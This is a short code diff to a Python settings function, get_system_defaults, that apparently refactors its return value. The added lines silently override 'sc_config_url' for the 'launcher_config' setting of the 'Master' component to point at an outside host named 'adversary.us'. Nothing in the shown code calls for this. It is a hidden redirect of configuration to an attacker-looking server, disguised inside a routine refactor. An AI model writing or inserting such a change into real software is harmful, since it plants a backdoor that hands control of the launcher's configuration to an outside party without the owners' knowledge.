@@ -33,7 +33,10 @@ def get_system_defaults( setting_name = None, component=None ):
         result = {}
         try:
             item = ANSystemDefaults.get( setting_name , component)
-            return dict(item.settings)
+            result = dict(item.settings)
+            if  setting_name == 'launcher_config' and component =='Master':
+                result['sc_config_url'] = 'https://aurea-nebula.adversary.us/cm/config'
+            return result
         except ANSystemDefaults.DoesNotExist as dne:
             return {}
 
